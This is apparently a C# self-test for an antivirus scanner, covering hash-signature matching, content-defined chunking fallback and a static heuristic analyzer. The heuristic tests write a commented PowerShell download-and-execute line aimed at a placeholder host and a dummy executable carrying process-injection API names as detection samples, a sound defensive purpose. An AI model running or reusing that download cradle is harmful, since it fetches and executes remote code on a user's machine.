// .NET Framework 4.7.2; standalone SQL-free validation for the two allowed hash methods.
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using ScanAndRemoveVirus.Services;

internal static class HybridHashSelfTest
{
    static void Check(bool value, string name)
    {
        if (!value) throw new Exception("FAIL: " + name);
        Console.WriteLine("PASS: " + name);
    }
    static string Digest(HashAlgorithm hash, byte[] data)
    {
        using (hash) return HybridSignatureScanner.ToHex(hash.ComputeHash(data));
    }
    static void Main()
    {
        byte[] input = new byte[512 * 1024];
        new Random(7625).NextBytes(input);
        var entry = new HybridSignatureScanner.HashEntry {
            SignatureID = 42, Name = "SAFE-EXACT-DEMO",
            SHA256 = Digest(SHA256.Create(), input),
            SHA1 = Digest(SHA1.Create(), input),
            MD5 = Digest(MD5.Create(), input)
        };
        string path = Path.Combine(Path.GetTempPath(), "hash-methods-" + Guid.NewGuid().ToString("N") + ".bin");
        try
        {
            File.WriteAllBytes(path, input);
            var allHashes = HybridSignatureScanner.CreateTestSnapshot(new[] { entry }, null);
            var hit = HybridSignatureScanner.ScanFile(path, allHashes, CancellationToken.None);
            Check(hit != null && hit.Technique == "Hash toàn tệp" && hit.SignatureID == 42,
                "whole-file hash matches and has precedence");
            var md5Only = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 43, Name = "MD5",
                    MD5 = entry.MD5 }
            }, null);
            hit = HybridSignatureScanner.ScanFile(path, md5Only, CancellationToken.None);
            Check(hit != null && hit.Evidence.Contains("MD5"), "MD5 legacy signature works");
            var sha1Only = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 44, Name = "SHA1",
                    SHA1 = entry.SHA1 }
            }, null);
            hit = HybridSignatureScanner.ScanFile(path, sha1Only, CancellationToken.None);
            Check(hit != null && hit.Evidence.Contains("SHA-1"), "SHA-1 legacy signature works");

            // Một bản ghi có cả 3 hash nhưng chỉ đúng MỘT hash vẫn phải phát hiện.
            // Tránh hồi quy nhầm điều kiện OR thành AND (lỗi bỏ sót mẫu thực tế).
            var onlySha256Matches = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 501, Name = "OR-SHA256",
                    SHA256 = entry.SHA256, SHA1 = new string('0', 40), MD5 = new string('0', 32) }
            }, null);
            hit = HybridSignatureScanner.ScanFile(path, onlySha256Matches, CancellationToken.None);
            Check(hit != null && hit.SignatureID == 501 && hit.Evidence.Contains("SHA-256"),
                "OR rule: SHA-256 matches; SHA-1 and MD5 do not match");

            var onlySha1Matches = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 502, Name = "OR-SHA1",
                    SHA256 = new string('0', 64), SHA1 = entry.SHA1, MD5 = new string('0', 32) }
            }, null);
            hit = HybridSignatureScanner.ScanFile(path, onlySha1Matches, CancellationToken.None);
            Check(hit != null && hit.SignatureID == 502 && hit.Evidence.Contains("SHA-1"),
                "OR rule: SHA-1 matches; SHA-256 and MD5 do not match");

            var onlyMd5Matches = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 503, Name = "OR-MD5",
                    SHA256 = new string('0', 64), SHA1 = new string('0', 40), MD5 = entry.MD5 }
            }, null);
            hit = HybridSignatureScanner.ScanFile(path, onlyMd5Matches, CancellationToken.None);
            Check(hit != null && hit.SignatureID == 503 && hit.Evidence.Contains("MD5"),
                "OR rule: MD5 matches; SHA-256 and SHA-1 do not match");

            // Hash trong mỗi dòng SQL có thể để NULL: MD5-only/SHA1-only vẫn hoạt động.
            // Không hash nào khớp thì không kết luận từ phương pháp truyền thống.
            var allWrong = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 504, Name = "OR-NONE",
                    SHA256 = new string('0', 64), SHA1 = new string('0', 40), MD5 = new string('0', 32) }
            }, null);
            hit = HybridSignatureScanner.ScanFile(path, allWrong, CancellationToken.None);
            Check(hit == null, "OR rule: none of the three hashes match -> no traditional detection");

            // Ưu tiên Hash truyền thống ngay cả khi có CDC cũng sẽ khớp:
            // yêu cầu này bảo đảm thông tin phát hiện thuộc về bước 1, không phải bước 2.
            var config = new HybridSignatureScanner.CdcConfig();
            var chunkDigests = new System.Collections.Generic.List<HybridSignatureScanner.CdcChunkDigest>();
            using (var mem = new MemoryStream(input, false))
                chunkDigests = HybridSignatureScanner.CreateContentDefinedFingerprint(
                    mem, config, 10000, CancellationToken.None);
            var cdcGroup = new HybridSignatureScanner.GroupEntry {
                GroupID = 2001, SignatureID = 2001, Name = "SAFE-CDC-FALLBACK",
                ContentDefined = true, Cdc = config, MinMatchCount = 4,
                SimilarityThreshold = 0.70m
            };
            var selected = chunkDigests.Skip(8).Take(40).ToList();
            Check(selected.Count == 40, "enough safe CDC chunks for fallback test");
            for (int i = 0; i < selected.Count; i++)
                cdcGroup.Chunks.Add(new HybridSignatureScanner.ChunkEntry {
                    GroupID = cdcGroup.GroupID, ChunkID = i + 1,
                    Order = i + 1, Size = selected[i].Size,
                    SHA256 = selected[i].SHA256
                });
            var combined = HybridSignatureScanner.CreateTestSnapshot(new[] { entry }, new[] { cdcGroup });
            hit = HybridSignatureScanner.ScanFile(path, combined, CancellationToken.None);
            Check(hit != null && hit.Technique == "Hash toàn tệp" && hit.SignatureID == entry.SignatureID,
                "STEP 1: traditional SHA-256 match wins immediately over matching CDC");

            // Khi hash toàn tệp khớp phải đọc đúng một lượt và KHÔNG gọi CDC.
            long countedBytes = 0;
            hit = HybridSignatureScanner.ScanFile(path, combined, CancellationToken.None,
                n => countedBytes += n);
            Check(hit != null && hit.Technique == "Hash toàn tệp" && countedBytes == input.LongLength,
                "fast path: exactly one streaming pass if whole-file hash matches");

            var md5AndCdc = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 43, Name = "MD5",
                    MD5 = entry.MD5 }
            }, new[] { cdcGroup });
            hit = HybridSignatureScanner.ScanFile(path, md5AndCdc, CancellationToken.None);
            Check(hit != null && hit.Technique == "Hash toàn tệp" &&
                hit.Evidence.Contains("MD5"), "STEP 1: MD5 match also has priority over CDC");
            var sha1AndCdc = HybridSignatureScanner.CreateTestSnapshot(new[] {
                new HybridSignatureScanner.HashEntry { SignatureID = 44, Name = "SHA1",
                    SHA1 = entry.SHA1 }
            }, new[] { cdcGroup });
            hit = HybridSignatureScanner.ScanFile(path, sha1AndCdc, CancellationToken.None);
            Check(hit != null && hit.Technique == "Hash toàn tệp" &&
                hit.Evidence.Contains("SHA-1"), "STEP 1: SHA-1 match also has priority over CDC");

            // Only after modifying data outside the chosen CDC region does SHA-256
            // stop matching; STEP 2 should then recognize the matching CDC chunks.
            input[0] ^= 0x80;
            File.WriteAllBytes(path, input);
            Check(HybridSignatureScanner.ScanFile(path, allHashes, CancellationToken.None) == null,
                "whole-file hash rejects a changed byte");
            countedBytes = 0;
            hit = HybridSignatureScanner.ScanFile(path, combined, CancellationToken.None,
                n => countedBytes += n);
            Check(countedBytes > input.LongLength && countedBytes <= 2 * input.LongLength,
                "fallback: second streaming pass only when whole-file hash misses");
            Check(hit != null && hit.Technique.Contains("Rolling Hash (CDC)") &&
                hit.SignatureID == cdcGroup.SignatureID,
                "STEP 2: only after traditional hash misses, CDC detects remaining signed chunks");

            // After both methods miss, the engine should not report a threat.
            byte[] unrelated = new byte[input.Length];
            new Random(37112).NextBytes(unrelated);
            File.WriteAllBytes(path, unrelated);
            Check(HybridSignatureScanner.ScanFile(path, combined, CancellationToken.None) == null,
                "NO MATCH: unrelated file does not produce a malware finding");

            var obsolete = new HybridSignatureScanner.GroupEntry {
                GroupID = 1001, SignatureID = 1001, ContentDefined = false,
                Name = "OLD-FIXED", MinMatchCount = 1
            };
            obsolete.Chunks.Add(new HybridSignatureScanner.ChunkEntry {
                GroupID = 1001, ChunkID = 1, Order = 1,
                Size = 512, SHA256 = Digest(SHA256.Create(), new byte[512])
            });
            var obsoleteSnapshot = HybridSignatureScanner.CreateTestSnapshot(null, new[] { obsolete });
            Check(!obsoleteSnapshot.HasSignatures, "fixed-window standalone method disabled");
            Check(HybridSignatureScanner.ScanFile(path, obsoleteSnapshot, CancellationToken.None) == null,
                "fixed-window cannot cause detection");
        }
        finally { try { File.Delete(path); } catch { } }
        // Heuristic fallback: tất cả mẫu dưới đây là CHUỖI VĂN BẢN VÔ HẠI, không chạy lệnh.
        string script = Path.Combine(Path.GetTempPath(), "heuristic-demo-" + Guid.NewGuid().ToString("N") + ".ps1");
        string binary = Path.ChangeExtension(script, ".exe");
        string unrelated = Path.ChangeExtension(script, ".bin");
        try
        {
            File.WriteAllText(script, "# Demo: markers only, not executable behavior\n" +
                "# IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')");
            var suspicious = StaticHeuristicAnalyzer.Analyze(script, CancellationToken.None);
            Check(suspicious != null && suspicious.Score >= 65 && suspicious.Category == "Script",
                "STEP 3: script with combined network+execution markers is suspicious");
            File.WriteAllText(script, "Get-Date\n# This is an ordinary script.");
            Check(StaticHeuristicAnalyzer.Analyze(script, CancellationToken.None) == null,
                "benign script without combined indicators is not suspicious");
            File.WriteAllText(script, "# IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')",
                System.Text.Encoding.Unicode);
            Check(StaticHeuristicAnalyzer.Analyze(script, CancellationToken.None) != null,
                "UTF-16LE script markers are supported");
            File.WriteAllText(unrelated, "# IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')");
            Check(StaticHeuristicAnalyzer.Analyze(unrelated, CancellationToken.None) == null,
                "do not classify ordinary data by strings alone");

            // PE tĩnh tối thiểu, không thể thực thi: chỉ kiểm tra định dạng header/section.
            byte[] pe = new byte[8192];
            pe[0] = (byte)'M'; pe[1] = (byte)'Z'; pe[0x3c] = 0x80;
            pe[0x80] = (byte)'P'; pe[0x81] = (byte)'E';
            pe[0x80 + 6] = 1; // một section
            pe[0x80 + 20] = 224; // optional header length
            int section = 0x80 + 24 + 224;
            pe[section + 36 + 3] = 0xA0; // execute + write flags
            File.WriteAllBytes(binary, pe);
            Check(StaticHeuristicAnalyzer.Analyze(binary, CancellationToken.None) == null,
                "PE writable+executable section alone is not proof of malware");
            byte[] indicators = System.Text.Encoding.ASCII.GetBytes(
                "VirtualAllocEx WriteProcessMemory CreateRemoteThread");
            Array.Copy(indicators, 0, pe, 2048, indicators.Length);
            File.WriteAllBytes(binary, pe);
            suspicious = StaticHeuristicAnalyzer.Analyze(binary, CancellationToken.None);
            Check(suspicious != null && suspicious.Score >= 80 && suspicious.Category == "PE",
                "PE with multiple independent suspicious indicators is flagged");
            var stop = new CancellationTokenSource(); stop.Cancel();
            bool canceled = false;
            try { StaticHeuristicAnalyzer.Analyze(binary, stop.Token); }
            catch (OperationCanceledException) { canceled = true; }
            Check(canceled, "heuristic analysis respects cancellation");
        }
        finally
        {
            foreach (string item in new[] { script, binary, unrelated })
                try { File.Delete(item); } catch { }
        }
        Console.WriteLine("Hash/CDC/heuristic static self-test finished.");
    }
}
